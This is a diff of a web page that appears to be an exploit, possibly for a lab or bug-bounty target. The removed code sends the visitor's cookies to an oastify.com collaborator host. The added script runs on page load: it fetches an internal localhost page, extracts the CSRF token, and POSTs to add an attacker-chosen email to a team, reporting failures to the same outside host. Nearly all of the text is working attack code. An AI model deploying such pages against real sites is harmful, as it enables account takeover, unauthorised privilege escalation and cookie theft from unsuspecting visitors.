@@ -1,19 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Fake Install Page</title>
-</head>
 <body>
-  <h2>Internal Tool Installer</h2>
+<script>
+// Step 1: Fetch internal page to extract CSRF token
+fetch("http://localhost:3000/apiv1/private/install")
+  .then(res => res.text())
+  .then(html => {
+    const match = html.match(/name="csrfToken" value="([^"]+)"/);
+    const csrf = match ? match[1] : null;
 
-  <button id="installbutton" onclick="installApp()">Install</button>
-
-  <script>
-    function installApp() {
-      // XSS logic after button click
-      const cookie = document.cookie;
-      fetch('https://gdxma7ijvjhcl8z82g5codwkebk28xwm.oastify.com/?cookie=' + encodeURIComponent(cookie));
+    if (!csrf) {
+      // Optionally log failure
+      fetch("https://gdxma7ijvjhcl8z82g5codwkebk28xwm.oastify.com/fail?reason=no_csrf");
+      return;
     }
-  </script>
+
+    // Step 2: Send POST to promote your user (replace with your username)
+    fetch("http://localhost:3000/api/teams/1/addUser/blhd3hfy48@bltiwd.com", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: "csrfToken=" + encodeURIComponent(csrf)
+    });
+  })
+  .catch(() => {
+    fetch("https://gdxma7ijvjhcl8z82g5codwkebk28xwm.oastify.com/fail?reason=fetch_error");
+  });
+</script>
 </body>
 </html>
